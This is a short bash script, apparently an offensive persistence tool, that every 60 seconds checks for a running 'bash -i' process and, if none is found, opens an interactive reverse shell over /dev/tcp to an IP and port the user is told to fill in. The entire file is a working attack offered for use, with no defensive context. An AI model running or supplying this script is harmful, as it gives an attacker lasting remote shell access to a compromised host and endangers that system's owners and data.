#!/bin/bash

IP=""  		#Insert your IP here
PORT=""		#Insert the Port you're listening on here. 

while(true); do
	if [ $(ps -ef | grep "bash -i" | grep -v grep | wc -l) -eq 0 ]
	then
		echo "Process not found, Launching reverse shell to $IP on port $PORT"
		bash -i >& /dev/tcp/$IP/$PORT 0>&1
	else
		echo "Process found, sleeping for 60 seconds..."
		ps -ef | grep "bash -i" | grep -v "grep" | wc -l
	fi
	sleep 60
done
